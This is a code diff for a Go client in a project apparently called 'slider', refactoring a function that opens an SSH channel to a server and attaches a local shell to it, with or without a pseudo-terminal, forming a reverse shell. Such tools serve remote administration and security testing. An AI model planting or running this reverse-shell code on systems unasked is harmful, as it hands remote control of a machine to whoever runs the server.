@@ -5,33 +5,27 @@ package client
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/creack/pty"
+	"golang.org/x/crypto/ssh"
 	"io"
 	"os/exec"
 	"slider/pkg/interpreter"
-
-	"github.com/creack/pty"
-	"golang.org/x/crypto/ssh"
 )
 
-func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) error {
-	stdin, stdinErr := sshSession.StdinPipe()
-	if stdinErr != nil {
-		c.Printf("session.StdinPipe: %s", stdinErr)
+func (c *client) sendReverseShell(request *ssh.Request) {
+	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
+	if openErr != nil {
+		c.Errorf("failed to open a \"session\" channel to server")
+		return
 	}
-	defer func() {
-		_ = stdin.Close()
-	}()
-	stdout, stdoutErr := sshSession.StdoutPipe()
-	if stdoutErr != nil {
-		c.Printf("session.StdoutPipe: %s", stdoutErr)
-	}
+	defer func() { _ = channel.Close() }()
 
 	cmd := exec.Command(c.interpreter.Shell, c.interpreter.ShellArgs...) //nolint:gosec
 
 	// Request Server Term Size
 	_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
 	if reqErr != nil {
-		return reqErr
+		c.Errorf("%s", reqErr)
 	}
 	var termSize interpreter.TermSize
 	if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
@@ -41,15 +35,15 @@ func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) err
 
 	if c.interpreter.PtyOn {
 		// Notify server we will be sending a PTY
-		errSSHReq := c.sendSessionRequest(sshSession, "pty-req", true, nil)
+		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
 		if errSSHReq != nil {
-			return fmt.Errorf("pty-req %s", errSSHReq)
+			c.Errorf("pty-req %s", errSSHReq)
 		}
 
 		// Notify server we will send a Reverse Shell
-		errSSHReq = c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
+		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			return fmt.Errorf("reverse-shell %s", errSSHReq)
+			c.Errorf("pty-req %s", errSSHReq)
 		}
 
 		c.ptyFile, _ = pty.StartWithSize(cmd, &pty.Winsize{
@@ -59,34 +53,31 @@ func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) err
 
 		// Copy all SSH session output to the term
 		go func() {
-			if _, outCopyErr := io.Copy(c.ptyFile, stdout); outCopyErr != nil {
+			if _, outCopyErr := io.Copy(c.ptyFile, channel); outCopyErr != nil {
 				c.Debugf("Copy stdout: %s", outCopyErr)
 			}
 		}()
 
 		// Answer Server we are good to go
-		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))
+		_ = c.replyConnRequest(request, true, []byte("shell-ready"))
 
 		// Copy term output to SSH session stdin
-		if _, inCopyErr := io.Copy(stdin, c.ptyFile); inCopyErr != nil {
+		if _, inCopyErr := io.Copy(channel, c.ptyFile); inCopyErr != nil {
 			c.Debugf("Copy stdin: %s", inCopyErr)
 		}
 	} else {
 		// Notify server we will send a Reverse Shell
-		errSSHReq := c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
+		_, errSSHReq := channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			return fmt.Errorf("reverse-shell %s", errSSHReq)
+			c.Errorf("reverse-shell %s", errSSHReq)
 		}
-		// Pipe requirement on Windows
-		rp, wp := io.Pipe()
-		go func() {
-			_, _ = io.Copy(wp, stdout)
-			c.Debugf("out finish")
-		}()
 
-		cmd.Stdout = stdin
-		cmd.Stdin = rp
-		cmd.Stderr = stdin
+		pr, pw := io.Pipe()
+
+		cmd.Stdin = channel
+		cmd.Stdout = pw
+		cmd.Stderr = pw
+		go func() { _, _ = io.Copy(channel, pr) }()
 
 		environment := []string{
 			fmt.Sprintf("LINES=%d", termSize.Rows),
@@ -97,12 +88,10 @@ func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) err
 		}
 
 		// Answer Server we are good to go
-		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))
+		_ = c.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if runErr := cmd.Run(); runErr != nil {
-			return runErr
+			c.Errorf("failed to execute command error - %s", runErr)
 		}
 	}
-
-	return nil
 }
